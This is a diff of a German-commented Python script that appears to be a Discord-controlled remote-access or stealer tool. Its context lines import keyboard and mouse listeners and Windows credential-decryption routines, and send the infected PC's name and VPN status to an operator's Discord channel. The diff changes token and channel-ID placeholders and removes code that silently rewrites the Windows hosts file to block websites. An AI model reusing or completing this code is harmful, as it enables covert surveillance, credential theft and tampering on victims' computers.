@@ -54,7 +54,7 @@ from cryptography.hazmat.backends import default_backend
 from pynput import mouse, keyboard
 from win32crypt import CryptUnprotectData
 
-TOKEN = 'DEIN BOT TOKEN'
+TOKEN = 'Dein Token'
 MAX_FILE_SIZE = 7.5 * 1024 * 1024  # 7,5 MB in Bytes
 
 def is_admin():
@@ -184,7 +184,7 @@ async def on_ready():
     vpn_enabled = False
 
     # Discord-Kanal abrufen
-    channel = bot.get_channel(DISCORD KANAL ID)  # Kanal-ID anpassen
+    channel = bot.get_channel(Deine Kanal ID)  # Kanal-ID anpassen
     if channel:
         embed = discord.Embed(
             title=f"PC-Status: {local_pc_name}",
@@ -201,61 +201,6 @@ async def on_ready():
         embed.add_field(name="VPN", value="Ja" if vpn_enabled else "Nein", inline=False)
 
         await channel.send(embed=embed)
-
-
-# Funktion zum Extrahieren der block.txt aus der EXE
-def get_block_txt():
-    if getattr(sys, 'frozen', False):
-        # Wenn das Skript als EXE ausgeführt wird, ist es in sys._MEIPASS eingebunden
-        bundle_dir = sys._MEIPASS
-    else:
-        # Wenn das Skript direkt als Python-Datei ausgeführt wird
-        bundle_dir = os.path.dirname(os.path.abspath(__file__))
-    
-    # Pfad zur eingebetteten block.txt
-    block_txt_path = os.path.join(bundle_dir, "block.txt")
-    
-    # Erstellen eines temporären Verzeichnisses und Kopieren der block.txt dorthin
-    temp_dir = tempfile.mkdtemp()
-    temp_block_txt = os.path.join(temp_dir, "block.txt")
-    shutil.copy(block_txt_path, temp_block_txt)
-    
-    return temp_block_txt
-
-# Dynamisch den Pfad zur Hosts-Datei ermitteln
-hosts_file_path = r"C:\Windows\System32\drivers\etc\hosts"
-
-def block_websites():
-    # Extrahieren der block.txt
-    block_txt = get_block_txt()
-    
-    # Prüfen, ob die block.txt existiert
-    if not os.path.exists(block_txt):
-        print(f"Die Datei block.txt wurde nicht gefunden.")
-        return
-
-    # Öffnen der block.txt und lesen der darin enthaltenen Websites
-    with open(block_txt, "r") as file:
-        websites_to_block = file.readlines()
-
-    # Einträge in der Hosts-Datei hinzufügen
-    try:
-        # Hosts-Datei mit Administratorrechten öffnen
-        with open(hosts_file_path, "a") as hosts_file:
-            for website in websites_to_block:
-                website = website.strip()  # Entfernen von Leerzeichen und Zeilenumbrüchen
-                if website:
-                    hosts_file.write(f"127.0.0.1 {website}\n")
-                    print(f"Website blockiert: {website}")
-        print("Alle Websites wurden erfolgreich blockiert.")
-    except PermissionError:
-        print("Fehler: Das Skript muss mit Administratorrechten ausgeführt werden.")
-    except Exception as e:
-        print(f"Ein Fehler ist aufgetreten: {e}")
-
-if __name__ == "__main__":
-    block_websites()
-
 
 @bot.command()
 async def test(ctx):
